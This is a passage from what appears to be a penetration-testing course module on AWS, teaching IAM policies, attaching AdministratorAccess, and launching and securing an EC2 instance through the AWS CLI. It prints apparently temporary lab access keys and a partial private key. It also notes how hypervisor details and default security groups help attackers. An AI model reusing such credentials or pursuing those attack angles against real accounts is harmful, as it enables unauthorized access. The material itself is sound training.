The _Version_ element at the beginning specifies the version of the policy language syntax rules. Current security best practices recommend using the latest version, i.e., "2012-10-17".

Next, we find the _Statement_ element, which is an array of statement objects. In the policy above, there is only one statement object with three elements: _Effect_, _Action_, and _Resource_.

_Effect_ indicates whether the policy allows or denies access. By default, there is an implicit "Deny" effect for all access, so it's most common to write policies with the "Allow" effect.

The _Action_ element describes the specific actions that will be allowed or denied, depending on the _Effect_ element. To describe the action, we start writing the service name prefix (iam, ec2, s3, rds, etc.), followed by the name of the action. In our sample policy, we use the wildcard ***** to refer to _all actions_ supported by the service. Each service documents its own list of supported actions that we can find in the API reference section of the documentation for the service.

The _Resource_ element specifies the objects that the statement covers. In our policy, we use a wildcard to refer to all resources; however, because we specify "all IAM actions" in the action element, the wildcard specifies all resources where IAM actions can be performed. To refer to a specific resource, we have to use the [_Amazon Resource Name_](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_identifiers.html#identifiers-arns) (ARN). Each resource has a unique ARN that we can obtain when we query information for the resource.

Normally, cloud administrators write their own policies to fit their specific environments. These policies are known as _Customer Managed Policies_. It's strongly recommended to use the _principle of least privilege_ to grant access when defining policies.

AWS also provides a list of pre-defined _AWS Managed Policies_ that we can also use for quickly assigning permission to identities based on job functions (e.g. _DatabaseAdministrator_ policy), or a specific set of permissions over services (e.g. _AmazonS3ReadOnlyAccess_ policy). However, it is highly recommended to only use these as a base for writing custom policies, since most of them are over-permissive.

We can list all customer and AWS managed policies with the **iam list-policies** command. Let's remember that our labadmin user doesn't currently have any associated policy, so we'll use our initial IAM user, which was configured with the _default_ profile.

```kali-shell
kali@kali:~$ aws iam list-policies
{
    "Policies": [
        {
            "PolicyName": "AWSDirectConnectReadOnlyAccess",
            "PolicyId": "ANPAI23HZ27SI6FQMGNQ2",
            "Arn": "arn:aws:iam::aws:policy/AWSDirectConnectReadOnlyAccess",
            "Path": "/",
            "DefaultVersionId": "v4",
            "AttachmentCount": 0,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "CreateDate": "2015-02-06T18:40:08+00:00",
            "UpdateDate": "2020-05-18T18:48:22+00:00"
        },
 ...
        {
            "PolicyName": "AdministratorAccess",
            "PolicyId": "ANPAIWMBCKSKIEE64ZLYK",
            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess",
            "Path": "/",
            "DefaultVersionId": "v1",
            "AttachmentCount": 4,
            "PermissionsBoundaryUsageCount": 0,
            "IsAttachable": true,
            "CreateDate": "2015-02-06T18:39:46+00:00",
            "UpdateDate": "2015-02-06T18:39:46+00:00"
        }
}
 ...
```

> Listing 13 - Listing all Managed Policies

To query the JSON document of the policy, we can use the **iam get-policy-version** command. We need to pass the ARN and the Version ID of the policy we want to query. We can retrieve that information from the list of policies we got before, and pass them with the **--policy-arn** and **--version-id** options. For example, let's retrieve the JSON document of the _AdministratorAccess_ policy.

```kali-shell
kali@kali:~$ aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --version-id v1
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2015-02-06T18:39:46+00:00"
    }
}
```

> Listing 14 - Getting the JSON Document of a Managed Policy

From the output, we learn that the _AdministratorAccess_ managed policy allows executing _any_ Action on _any_ Resource.

To attach managed policies to IAM users, we can use the **iam attach-user-policy** command. We'll pass two arguments: the IAM user name with **--user-name**, and the ARN of the policy with **--policy-arn**.

```kali-shell
kali@kali:~$ aws iam attach-user-policy --user-name labadmin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

```

> Listing 15 - Attaching a Managed Policy to an IAM User

We should now be able to run any command with the _labadmin_ profile. Let's run **iam get-attached-user-policies** with the argument **--user-name labadmin** to confirm that the policy is indeed attached to the _labadmin_ IAM user.

```kali-shell
kali@kali:~$ aws --profile labadmin iam list-attached-user-policies --user-name labadmin
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

> Listing 16 - Listing labadmin IAM User Attached Managed Policies

The _AdministratorAccess_ policy is another example of an AWS managed policy based on a job function. There are a few more of these types of policies. We can find a complete list on the documentation page [_AWS Managed policies for job functions_](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html).

We can also list all the policies using the Management Console, where we can filter and search the policies easier than using the CLI. After we log into the Management Console, we can press E+s to place the cursor into the _Services Search Box_, then type **iam**. Some services appear after we finish typing. Let's locate and click on the "IAM service" to go to the _IAM service_ page. Here, we'll locate the menu on the right and go to the _Access Management_ > _Policies_ page to list all the policies.

The previous example works well for learning purposes but in general, when writing policies and assigning permissions to IAM users, it's strongly advised to grant least privilege access. We should avoid policies that use the "*" wildcard and instead limit the scope to the specific actions and resources we need to address. Many attack vectors facing cloud environments leverage excessive permissions granted to users, as it is common to find an IAM user with the _AdministratorAccess_ policy attached. This _can_ be fine, as long as users with that level of privileges are only used in special cases by the cloud administrator, and specific security mechanisms such as strong passwords and multi-factor authentication are implemented for those users.

We'll also notice that the access keys stored in our _filesystem_ are in cleartext, so if an attacker manages to obtain access to a machine with AWS CLI configured, they will be able to interact with AWS using those credentials. A better approach is to create roles with high-level access and use low-privileged IAM users to assume the role with temporary credentials. However, this is out of the scope of this Module.

It is also important to review the Identity and Access documentation for each service we configure in AWS. Each service has some particular aspects that we should take into account. Carefully understanding the IAM parameters associated with the service can help us more easily identify any potential misconfigurations. As cloud administrators, it's also important to read this information to know how to properly configure access to resources.

How to use the Cloud Grader for the challenges:

Some of the cloud challenges will have exercises that involve creating or configuring resources in the provided AWS account. OffSec's cloud grader is a way to measure the state of resources and configurations for such challenges.

An exercise that uses the cloud grader feature will normally have a set of tasks to run in the AWS account. After completing the required objectives, we need to click the "grade button" to validate the lab state. If the tasks were completed according to the requirements in the exercise, the answer will be marked as completed. We can then continue to the next exercise.

It's mandatory to complete the exercises in sequential order, starting from 1. Otherwise, the grader will probably fail to identify the correct challenge state.

It's important to create only the exact number of resources specified in the exercise prompt. If other resources were created during the challenge, they should be deleted to avoid getting failures while running the grader.

If we restart the challenge lab at any point, we need to start over from exercise 1, even if previous exercises are marked as completed. It's recommended to take notes of the commands in a text file or bash script as we are advancing through the exercises. This will allow us to quickly reproduce the tasks again and continue where we left off.

#### Labs

1. Create an IAM user with the name _cli-user_ and another IAM user with the name _console-user_. Ensure this exercise is marked as completed before proceeding with the next one.

Answer

2. Create credentials for the IAM user _cli-user_ so it only has programmatically access. Then, create credentials for the IAM user _console-user_ to interact only via the Management Console. Ensure this exercise is marked as complete before moving on to the next one.

Answer

3. Continue with this exercise once the prior tasks have been marked as complete. Attach the _AmazonEC2ReadOnlyAccess_ AWS managed policy to _cli-user_ IAM user. Ensure this exercise is marked as complete before moving on to the next one.

Answer

4. After completing the previous tasks, use the AWS Management Console to search for an AWS-managed policy that grants full access permissions for setting up and configuring AWS network resources. Filter and search for the specific job function. Once you locate the policy, attach it to the _console-user_ IAM user. The Management Console is recommended for this exercise due to its ease of filtering and searching for policies based on job functions.

Answer

## 6.3.3. Accessing the Compute Services Lab

We will use an AWS account and the AWS CLI to follow along with the commands and activities in the next section. We can review the _Accessing the Lab_ section at the beginning of this Module for instructions on installing AWS CLI in a Kali virtual machine.

We will mostly use the AWS CLI to interact with our AWS infrastructure, although it is encouraged to review the corresponding actions and results in the Management Console as an extra mile activity.

Credentials for accessing the AWS Management Console and access keys for programmatical interaction are provided when starting the lab and they will be temporarily valid for a few hours. After that, we'll need to start the lab again to retrieve new credentials.

To follow along with the content in the next section, we need to configure the AWS CLI to use the newly-retrieved credentials. We'll run the **aws configure** command, then input the _Access Key ID_ and the _Secret Access Key_. We will be working in _Region_ **us-east-1** throughout this module, so let's set the _Default region name_ to that value, too. We can leave the last parameter blank, and it will default to _json_.

To validate that the credentials are working correctly, let's use the **aws sts get-caller-identity**, which will only return a valid response if we are using valid credentials.

```kali-shell
kali@kali:~$ aws configure
AWS Access Key ID [None]: AKIAQOMAIGYUQOXBV3HR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:

kali@kali:~$ aws sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/learner"
}
```

> Listing 4 - Configuring AWS CLI and validate user.

For now, we'll simply start the lab to retrieve credentials and validate that we can interact with the AWS API via the Management Console and CLI.

## 6.3.4. Compute Services in AWS

_Compute services_ are the key components in cloud computing applications. AWS offers a variety of computing services that seek to lessen the burden of IT management for customers, so they can focus mainly on their core services. We will cover some of these services in this section.

[AWS Elastic Cloud Computing](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/concepts.html) (EC2),launched in 2006, is one of the first services available in AWS. We may recall using this service at the beginning of this Module to deploy a virtual machine through the AWS Management Console. In this section, we'll use AWS CLI to deploy an EC2 instance.

[_Auto-scaling_](https://aws.amazon.com/autoscaling/) is another key feature in EC2 and other compute services that is very common to have as part of the cloud computing model. Auto-scaling allows for the automatic adjustment of computing resources in response to changes in demand workload. It works by monitoring an _indicator_, like CPU or network usage, and adding or removing compute instances as needed to meet the demands of the workload based on pre-configured rules and policies. For example, if the CPU load usage exceeds 75%, resources would scale up by automatically deploying one more compute instance. Then, if the CPU load usage falls below 30%, it would scale down by removing a compute instance. These type of features are a good example on how dynamic cloud infrastructures can be.

We have a few options for managing [_container-based architectures_](https://glossary.cncf.io/containerization/). [_AWS Elastic Container Service_](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/Welcome.html) (ECS) is a managed [_container orchestration_](https://glossary.cncf.io/container-orchestration/) platform. For teams that are already comfortable working with [_Kubernetes_](https://kubernetes.io/), AWS also provides the [_Elastic Kubernetes Service_](https://docs.aws.amazon.com/eks/latest/userguide/getting-started.html),(EKS) which is a Kubernetes implementation for container orchestration inside the AWS cloud. When deploying containers, we can choose between EC2 instances or [_AWS Fargate_](https://docs.aws.amazon.com/AmazonECS/latest/userguide/what-is-fargate.html), a [_serverless compute engine_](https://glossary.cncf.io/serverless/) specific for containers, so customers don't need to worry about managing and scaling compute instances.

Generally, most of the AWS compute services provide an abstraction layer over the deployment process of resources and the underlying infrastructure, making it easier for customers to focus on the application development process. These services enable the serverless computing model. Although the term "serverless" is used, it doesn't really mean that there are no servers involved; they exist, but they are managed entirely by providers like AWS. Let's review some other AWS compute services to better understand this concept.

[_AWS Elastic Beanstalk_](https://docs.aws.amazon.com/elasticbeanstalk/latest/dg/Welcome.html) is a service that provides computing without worrying about infrastructure management. We can upload the source code of our application to Elastic Beanstalk and it manages the deployment, capacity provisioning, load balancing, scaling, and health monitoring of cloud resources.

[_AWS App Runner_](https://docs.aws.amazon.com/apprunner/latest/dg/what-is-apprunner.html)is a similar service that deploys web applications including API services, backend web services, and websites. The applications are deployed in containers entirely managed by AWS, so we don't need to maintain a container orchestration platform by ourselves. App Runner is also suitable for [_Continuous Integration_](https://glossary.cncf.io/continuous-integration/) and [_Continuous Deployment_](https://glossary.cncf.io/continuous-deployment/) (_CI/CD_) practices because it can obtain code directly from a _GitHub_ repository.

Another commonly-used compute service is [_AWS Lambda_](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html), a serverless and event-driven computing platform that runs code in response to events and manages the computing resources required to execute the code. This works like a _function-on-demand_ service, allowing us to run code for several runtime environments, including _Python_, _Node.js_, _Java_, _Go_, _Ruby_, and _C#_.

Since there are many offerings for running applications in AWS depending on the cloud architecture that best aligns with our needs, this also means a broader attack surface of applications to target.

Because these services primarily focus on _computation_, they commonly need to interact with other AWS features to manage resources like network communication, storage, and security. A flaw in any of these applications, which could result in command execution on the compute service, has the potential to jeopardize other services within the cloud infrastructure.

Let's run an EC2 instance to analyze some of the components required. The following table matches the core components with their corresponding EC2 feature.

|Instance Component|EC2 feature|
|---|---|
|CPU and RAM|EC2 Instance Type|
|Operating System|Amazon Machine Images (AMI)|
|Disk|Elastic Block Store (EBS)|
|Network connection|Virtual Private Cloud (VPC)|

> Table 2 - EC2 Instance Components

Before running an EC2 instance, we first have to define what type of computing power we require in order to choose the appropriate [_instance type_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-types.html). AWS offers several instance types, which are combinations of CPU, memory, storage, and networking capacity tailored for different use cases (_General purpose_, _Compute-optimized_, _Memory-optimized_, _Storage-optimized_, etc). Each instance type includes one or more _instance sizes_ that allow scaling resources to the requirements of the application workload.

In the AWS CLI, we can use **ec2 describe-instance-type-offerings** to list all of the instance types available to choose from. To improve readability, we can change the formatting style of the output by using the **--output table** argument to receive the data printed in a table format instead of the default JSON.

The **--region** argument is also required when working with some services and subcommands. Because we set a default region when we configured the AWS CLI, we can omit this argument and it will default to the region we set, _us-east-1_.

```kali-shell
kali@kali:~$ aws ec2 describe-instance-type-offerings --output table
------------------------------------------------------
|            DescribeInstanceTypeOfferings           |
+----------------------------------------------------+
||               InstanceTypeOfferings              ||
|+-------------------+-------------+----------------+|
||   InstanceType    |  Location   | LocationType   ||
|+-------------------+-------------+----------------+|
||  x2iedn.4xlarge   |  us-east-1  |  region        ||
||  m6i.8xlarge      |  us-east-1  |  region        ||
||  m1.small         |  us-east-1  |  region        ||
||  m6gd.metal       |  us-east-1  |  region        ||

...

```

> Listing 17 - Listing Instance Types Offered

We'll notice there are plenty of options, and we can also identify a pattern in the naming. We'll not dive too deep into this. For now, we'll just keep in mind that the first part of the name before the period indicates the instance's family, generation, and attributes. The second part after the period indicates the instance size.

In our deployment, we'll choose the **t2.micro** instance type, which is for burstable performance general purpose instances. "Burstable performance" means that it provides a baseline level of CPU performance with the ability to burst above the baseline. The micro size configures 1 _virtual CPU_ (vCPU) and 1 GiB of RAM, among other technical details. We can check all the details using the **aws ec2 describe-instance-types --instance-types t2.micro** command.

```kali-shell
kali@kali:~$ aws ec2 describe-instance-types --instance-types t2.micro
{
    "InstanceTypes": [
        {
            "InstanceType": "t2.micro",
            "CurrentGeneration": true,
            "FreeTierEligible": true,
            "SupportedUsageClasses": [
                "on-demand",
                "spot"
            ],
            "SupportedRootDeviceTypes": [
                "ebs"
            ],
            "SupportedVirtualizationTypes": [
                "hvm"
            ],
            "BareMetal": false,
            "Hypervisor": "xen",
            "ProcessorInfo": {
                "SupportedArchitectures": [
                    "i386",
                    "x86_64"
                ],
                "SustainedClockSpeedInGhz": 2.5
            },
            "VCpuInfo": {
                "DefaultVCpus": 1,
                "DefaultCores": 1,
                "DefaultThreadsPerCore": 1
            },
            "MemoryInfo": {
                "SizeInMiB": 1024
            },
            "InstanceStorageSupported": false,
            "EbsInfo": {
                "EbsOptimizedSupport": "unsupported",
                "EncryptionSupport": "supported",
                "NvmeSupport": "unsupported"
            },
            "NetworkInfo": {
                "NetworkPerformance": "Low to Moderate",
                "MaximumNetworkInterfaces": 2,
                "MaximumNetworkCards": 1,
                "DefaultNetworkCardIndex": 0,
                "NetworkCards": [
```

> Listing 18 - Describing the t2.micro Instance Type

We'll notice that the instance type specifies some of the physical hardware resources that the virtual machine will allocate. We can also check virtualization details, such as the hypervisor technology, which is valuable information for _virtual machine escape_(https://www.techtarget.com/whatis/definition/virtual-machine-escape) exploits.

Now that we've specified hardware elements by selecting an instance type, let's learn how to specify software.

An [_Amazon Machine Image_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html) (AMI) is a pre-configured machine image that includes the operating system and any additional software the AMI creator installed. To deploy an EC2 instance, we must first choose an AMI. One place we can browse for AMIs is the [_AWS Marketplace_](https://docs.aws.amazon.com/marketplace/latest/userguide/what-is-marketplace.html).

We can also use the CLI to list AMIs with **ec2 describe-images**, although running this command without any filtering could take a minute or two to complete, and it will output thousands of AMIs. By using the **--filter "Name=description,Values=*Kali*"** argument, we'll filter in the field _description_ for values that have the word "Kali" in any part of the string.

```kali-shell
kali@kali:~$ aws ec2 describe-images --filter "Name=description,Values=*Kali*"
{
    "Images": [
        {
            "Architecture": "x86_64",
            "CreationDate": "2022-02-01T05:53:30.000Z",
            "ImageId": "ami-08088d20d0bd90ef1",
            "ImageLocation": "099507852522/a18142b3-5764-48b3-968b-74980eb29ef4",
            "ImageType": "machine",
            "Public": true,
            "OwnerId": "099507852522",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "State": "available",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": false,
                        "SnapshotId": "snap-0100056ab574f26bb",
                        "VolumeSize": 32,
                        "VolumeType": "gp2",
                        "Encrypted": false
                    }
                }
            ],
            "Description": "Template: Kali",
            "Hypervisor": "xen",
            "Name": "a18142b3-5764-48b3-968b-74980eb29ef4",
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "VirtualizationType": "hvm",
            "DeprecationTime": "2024-02-01T05:53:30.000Z"
        },
...
        {
            "Architecture": "x86_64",
            "CreationDate": "2022-12-09T20:54:14.000Z",
            "ImageId": "ami-06e9ed0799116d0dd",
            "ImageLocation": "aws-marketplace/kali-rolling-amd64-2022.4.1-804fcc46-63fc-4eb6-85a1-50e66d6c7215",
            "ImageType": "machine",
            "Public": true,
            "OwnerId": "679593333241",
            "PlatformDetails": "Linux/UNIX",
            "UsageOperation": "RunInstances",
            "ProductCodes": [
                {
                    "ProductCodeId": "7lgvy7mt78lgoi4lant0znp5h",
                    "ProductCodeType": "marketplace"
                }
            ],
            "State": "available",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/xvda",
                    "Ebs": {
                        "DeleteOnTermination": true,
                        "SnapshotId": "snap-0752711244d8048da",
                        "VolumeSize": 12,
                        "VolumeType": "gp2",
                        "Encrypted": false
                    }
                }
            ],
            "Description": "Kali Linux kali-rolling (2022.4.1)",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "ImageOwnerAlias": "aws-marketplace",
            "Name": "kali-rolling-amd64-2022.4.1-804fcc46-63fc-4eb6-85a1-50e66d6c7215",
            "RootDeviceName": "/dev/xvda",
            "RootDeviceType": "ebs",
            "SriovNetSupport": "simple",
            "VirtualizationType": "hvm",
            "DeprecationTime": "2024-12-09T20:54:14.000Z"
        },
...
```

> Listing 19 - Listing All AMIs that Contain 'Kali' in the Description Field

In the _OwnerId_ and _ImageLocation_ attributes, we can find the account ID that shared the AMI. The account ID "679593333241" belongs to AWS Marketplace, which we can confirm in the _ImageLocation_ and _ImageOwnerAlias_ attributes of the image. The output shows that some images were published through the AWS Marketplace by Amazon or third-party vendors. In this case, the _kali-rolling_ image is [Offsec's official Kali AMI](https://aws.amazon.com/marketplace/pp/prodview-fznsw3f7mq7to). Other images are shared by other AWS accounts. As AWS users, we need to be careful when choosing an AMI. We should always verify the source and make sure to trust the origin. As pentesters, inspecting publicly-shared resources is something we'll want to execute in our assessments.

To use an AMI from the Marketplace, we first need to subscribe to it. This is because we need to accept some agreements about the usage of the image, and sometimes there might be extra charges for using a particular AMI. Rather than continuing this subscription process, we'll instead use Amazon's quickstart AMIs that don't need a subscription.

Let's use the **ec2 describe-images** command again. This time we'll add the **--owner amazon** argument, which will return only the AMIs that are created by Amazon.

As before, we'll filter for AMIs based on the _description_ field using the argument **--filter "Name=description,Values=Amazon Linux $(date +%Y)*"**, but this time, we're searching for descriptions starting with the string "Amazon Linux", followed by the current year that will be the output of the command **date +%Y**.

These AMIs are periodically patched, and we can find several versions of them. We want to make sure we pick the most recently created AMI, so we'll add the argument **--query 'sort_by(Images, &CreationDate)[-1]'**. The **--query** argument allows us to select specific data from the JSON response we received. We are sorting the images by the _CreationDate_ attribute, and using **[-1]**, we can select the last element of the sorted array, which is the most recently created AMI.

```kali-shell
kali@kali:~$ aws ec2 describe-images --owner amazon --filter "Name=description,Values=Amazon Linux $(date +%Y)*" --query 'sort_by(Images, &CreationDate)[-1]'
{
    "Architecture": "arm64",
    "CreationDate": "2023-05-15T20:29:07.000Z",
    "ImageId": "ami-08c03e0a9820232d8",
    "ImageLocation": "amazon/al2023-ami-minimal-2023.0.20230517.1-kernel-6.1-arm64",
    "ImageType": "machine",
    "Public": true,
    "OwnerId": "137112412989",
    "PlatformDetails": "Linux/UNIX",
    "UsageOperation": "RunInstances",
    "State": "available",
    "BlockDeviceMappings": [
        {
            "DeviceName": "/dev/xvda",
            "Ebs": {
                "DeleteOnTermination": true,
                "Iops": 3000,
                "SnapshotId": "snap-0a85e44fed3b390d2",
                "VolumeSize": 8,
                "VolumeType": "gp3",
                "Throughput": 125,
                "Encrypted": false
            }
        }
    ],
    "Description": "Amazon Linux 2023 AMI 2023.0.20230517.1 arm64 Minimal HVM kernel-6.1",
    "EnaSupport": true,
    "Hypervisor": "xen",
    "ImageOwnerAlias": "amazon",
    "Name": "al2023-ami-minimal-2023.0.20230517.1-kernel-6.1-arm64",
    "RootDeviceName": "/dev/xvda",
    "RootDeviceType": "ebs",
    "SriovNetSupport": "simple",
    "VirtualizationType": "hvm",
    "BootMode": "uefi",
    "DeprecationTime": "2023-08-13T20:29:00.000Z",
    "ImdsSupport": "v2.0"
}
```

> Listing 20 - Getting the Most Recent Amazon Linux AMI

From the output, we'll take note of the _ImageId_ value, which we will use later for deploying our EC2 instance.

We'll also notice that the image data contains information about _disks_. In the case of our image, it specifies one disk device named **/dev/xvda** that is 8GB in size. This disk device is also referenced in the _RootDeviceName_ attribute. The _root device_ is the default storage device that stores the operating system and other system files. The _RootDeviceType_ is [_Elastic Block Store_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AmazonEBS.html) (EBS). EBS is an AWS service that provides virtual disks to other AWS services, mostly the EC2 service.

We can attach additional EBS volumes when deploying the instance or at any time later. If we don't specify any, only a storage device will be created as the root device, according to the AMI specifications.

To provide network access, we need to create a [_Virtual Private Cloud_](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html) (VPC) and [_subnets_](https://docs.aws.amazon.com/vpc/latest/userguide/configure-subnets.html). A VPC is an abstraction that resembles a traditional on-premise network. The VPC contains and manages all network-related resources like IP addressing, subnets, routing, gateways and endpoints, VPN connections, etc. A normal AWS account we create from the AWS website creates a default VPC in every Region and a subnet for every Availability Zone in that Region. It's a good practice, however, to design a network plan and create VPCs according to our specific cloud environment architecture.

After we deploy our EC2 instance, we'll use SSH to connect remotely. However, for good security practices, AWS enforces the usage of a _key pair_, which consists of a _private key_ and a _public key_ for connecting to EC2 instances via SSH. To later connect to the instance, we need to have the previously-created key pair to specify at the moment of deployment.

The **ec2 create-key-pair** command creates a key pair. For identification purposes, we need to provide a name for it using the **--key-name mykeypair** argument. We will use that name later to specify the keypair to use.

The last part of the command, **--query 'KeyMaterial' --output text**, filters the JSON output to only show the the private key. This allows us to copy it and create our private key file.

Instead of copying and pasting, we'll pipe the previous command's output to the **tee** tool. This tool will take the previous output and write the content of it in the file **/home/kali/mykeypair.pem**. We are using **tee** because it also redirects the output to the standard output, so we can observe it in the command line too, but a standard redirection would also work well.

```kali-shell
kali@kali:~$ aws ec2 create-key-pair --key-name mykeypair  --query 'KeyMaterial' --output text | tee /home/kali/mykeypair.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAhJNWIMqbQHIFUvZxIW8iruQx7UCWeGr1pOpyO9iFdgjdEk+v
...
4yqgR9qcCzmxWmgpkiwiwlDIwfEwvS7HQ+T+2UZ6KpzsHdT+oacr
-----END RSA PRIVATE KEY-----
```

> Listing 21 - Creating a Key Pair

Putting all the pieces together, let's run an EC2 instance from the AWS CLI using the **ec2 run-instances** command. With the **--image-id ami-01fd540f4454e166c** argument, we'll specify the ID of the AMI we retrieved earlier. The **--instance-type t2.micro** argument specifies the instance type. The **--key-name mykeypair** argument specifies the key pair we'll use for connecting to the instance.

If the command launches successfully, we'll receive an output in JSON format with the details of the instance we created.

```kali-shell
kali@kali:~$ aws ec2 run-instances --image-id ami-01fd540f4454e166c --instance-type t2.micro --key-name mykeypair
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-01fd540f4454e166c",
            "InstanceId": "i-0962235740f8d0ea4",
            "InstanceType": "t2.micro",
            "KeyName": "mykeypair",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "us-east-1b",
                "GroupName": "",
                "Tenancy": "default"
            },
...
```

> Listing 22 - Launching an EC2 Instance

We can now run **ec2 describe-instances** to list all instances and their configuration details. We can also pass the **--instance-id** argument to describe a specific instance.

```kali-shell
kali@kali:~$ aws ec2 describe-instances --instance-id i-0962235740f8d0ea4
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-01fd540f4454e166c",
                    "InstanceId": "i-0962235740f8d0ea4",
                    "InstanceType": "t2.micro",
                    "KeyName": "mykeypair",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "us-east-1b",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-172-31-80-98.ec2.internal",
                    "PrivateIpAddress": "172.31.80.98",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-18-207-244-209.compute-1.amazonaws.com",
                    "PublicIpAddress": "18.207.244.209",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
...
```

> Listing 23 - Describing an EC2 Instance

By default, the instance has a private and a public IP address and DNS names. We can use the public IP address or public DNS name to connect to the instance via SSH using the private key we created before. However, at this point, the SSH connection won't be possible because by default, all network connections to the instances are blocked. We'll work around this. For now, let's save the public IP address 18.207.244.209.

[Security groups](https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html) let us control incoming and outgoing traffic for cloud resources, like EC2 instances. We can think of security groups as a special "front gate" of a house in which we can specify inbound rules to determine who can enter, for example, only family members. We can also specify outbound rules as well, to permit only certain people to leave. We can only specify "ALLOW" rules. Everything else is "DENIED". One awesome feature of of this special "front gate" is that we can associate it with another house to apply the same rules, just as we associate security groups to EC2 instances to allow specific traffic based on protocols and port numbers.

Let's describe our EC2 instance again, this time searching for the _SecurityGroups_ Attribute.

```kali-shell
kali@kali:~$ aws ec2 describe-instances --instance-id i-0962235740f8d0ea4
...
                    "RootDeviceName": "/dev/xvda",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupName": "default",
                            "GroupId": "sg-0723e6725b8a98c2a"
                        }
...
```

> Listing 24 - Describing an EC2 Instance and Checking the SecurityGroups Attribute

We didn't specify a security group when we deployed the instance, so the _default_ security group was associated with it. The **ec2 describe-security-groups** command will list all the security groups we have in our default Region. We can describe a specific security group using the **--group-name** argument. Let's analyze the _default_ security group.

```kali-shell
kali@kali:~$ aws ec2 describe-security-groups --group-name default
{
    "SecurityGroups": [
        {
            "Description": "default VPC security group",
            "GroupName": "default",
            "IpPermissions": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": [
                        {
                            "GroupId": "sg-0723e6725b8a98c2a",
                            "UserId": "123456789012"
                        }
                    ]
                }
            ],
            "OwnerId": "123456789012",
            "GroupId": "sg-0723e6725b8a98c2a",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "Tags": [
                {
                    "Key": "map-migrated",
                    "Value": "d-server-00hbvn2ojxa300"
                }
            ],
            "VpcId": "vpc-0f0900c5a375bf299"
        }
    ]
}
```

> Listing 25 - Describing the Default Security Group

Inbound rules are defined inside the _IpPermissions_ property. The value of _IpRanges_ is an empty _array []_, meaning there is no inbound permission from any IPv4 address. The _UserIdGroupPairs_ property has a _GroupId_ defined, which is the same ID as this security group. Essentially, this inbound rule only allows traffic from all resources that are assigned to this security group. This means that if we can get access to an EC2 instance, we could potentially have full network access to other EC2 instances associated with the same security group, assuming the cloud _admin_ kept the default rules.

The _IpPermissionsEgress_ property defines outbound rules. There is only one rule, and it allows all outbound IPv4 traffic.

Ideally, to follow security best practices, we'd want to create a new security group, but for now, we'll add an inbound rule to the _default_ security group to allow SSH traffic.

We don't want to allow SSH from all of the internet with a 0.0.0.0/0 source, so first, let's retrieve our public IP using the **curl** command. Next, we'll add an inbound rule with the **ec2 authorize-security-group-ingress** command. We can specify the default security group with the **--group-name default** argument. We want to allow TCP connections to port 22 (SSH) from our public IP, so we'll use the **--protocol tcp**, **--port 22** and **--cidr 1.2.3.4/32** arguments.

```kali-shell
kali@kali:~$ curl ifconfig.me
1.2.3.4

kali@kali:~$ aws ec2 authorize-security-group-ingress --group-name default --protocol tcp --port 22 --cidr 1.2.3.4/32
{
    "Return": true,
    "SecurityGroupRules": [
        {
            "SecurityGroupRuleId": "sgr-06ca9964a9a475bfc",
            "GroupId": "sg-0723e6725b8a98c2a",
            "GroupOwnerId": "123456789012",
            "IsEgress": false,
            "IpProtocol": "tcp",
            "FromPort": 22,
            "ToPort": 22,
            "CidrIpv4": "1.2.3.4/32"
        }
    ]
}
```

> Listing 26 - Adding an Inbound Rule to the Default Security Group

We got a JSON object with the new rule as a response, meaning the command ran successfully.

Now we can connect via SSH to our EC2 instance. If we didn't take note of our instance's public IP, we can retrieve it with the **ec2 describe-instances** command we learned earlier. The default user for the Amazon Linux OS is _ec2-user_. We'll also need to specify the private key we saved before in the _kali_ users' **home** directory with the **-i /home/kali/mykeypair.pem** argument.

```kali-shell
